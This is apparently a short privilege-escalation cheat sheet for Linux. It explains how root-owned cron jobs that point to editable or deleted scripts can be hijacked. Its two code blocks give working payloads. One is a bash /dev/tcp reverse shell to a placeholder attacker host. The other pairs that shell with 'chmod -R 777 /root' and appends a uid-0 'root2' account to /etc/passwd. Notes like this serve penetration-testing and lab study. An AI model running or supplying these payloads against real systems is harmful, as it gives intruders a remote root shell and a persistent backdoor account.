#LinuxPrivEsc 
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. 
If there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

1.  System administrators need to run a script at regular intervals.
2.  They create a cron job to do this
3.  After a while, the script becomes useless, and they delete it  
4.  They do not clean the relevant cron job

*Always edit the script to obtain a root reverse shell*
```bash
#!/bin/bash
bash -i >& /dev/tcp/machine_ip/port_number 0>&1 
```

>If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the /etc/crontab

```bash
bash -i >& /dev/tcp/MACHINE_IP/PORT 0>&1;
chmod -R 777 /root/;
echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
```